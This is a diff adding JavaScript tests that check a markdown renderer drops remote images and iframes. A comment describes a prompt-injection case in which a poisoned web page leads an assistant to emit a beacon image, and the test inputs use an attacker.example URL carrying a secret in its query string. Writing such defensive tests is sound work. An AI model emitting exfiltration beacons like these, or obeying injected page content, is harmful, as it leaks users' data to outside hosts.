@@ -25,3 +25,24 @@ describe('renderMarkdownToHtml', () => {
     expect(html).not.toContain('copy-btn');
   });
 });
+
+describe('remote subresources', () => {
+  // Once the assistant can read the web, a poisoned page can talk it into
+  // emitting a beacon image. Rendering must never issue that request.
+  it('drops images rather than rendering a remote fetch', () => {
+    const html = renderMarkdownToHtml('![x](https://attacker.example/pixel?q=secret)');
+    expect(html).not.toContain('attacker.example');
+    expect(html).not.toContain('<img');
+  });
+
+  it('drops raw html media tags too', () => {
+    const html = renderMarkdownToHtml('<iframe src="https://attacker.example"></iframe>');
+    expect(html).not.toContain('attacker.example');
+  });
+
+  it('still renders ordinary links and text', () => {
+    const html = renderMarkdownToHtml('see [the docs](https://example.com/docs)');
+    expect(html).toContain('https://example.com/docs');
+    expect(html).toContain('the docs');
+  });
+});
